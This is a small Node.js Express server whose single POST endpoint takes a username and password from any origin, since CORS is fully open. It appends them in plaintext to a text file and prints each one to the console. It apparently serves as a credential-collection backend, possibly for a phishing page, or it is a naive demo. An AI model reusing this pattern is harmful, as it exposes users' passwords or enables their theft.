import express from 'express';
import fs from 'fs';
import path from 'path';
import cors from 'cors';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

// Needed to simulate __dirname in ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

app.post('/api/save', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send('Missing username or password');
  }

  const filePath = path.resolve(__dirname, 'inputs.txt');
  const entry = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile(filePath, entry, (err) => {
    if (err) {
      console.error('Write error:', err);
      return res.status(500).send('Server error');
    }
    console.log('Saved:', entry.trim());
    res.send('Saved successfully');
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});

app.get('/', (req, res) => {
  res.send('Welcome to the server!');
});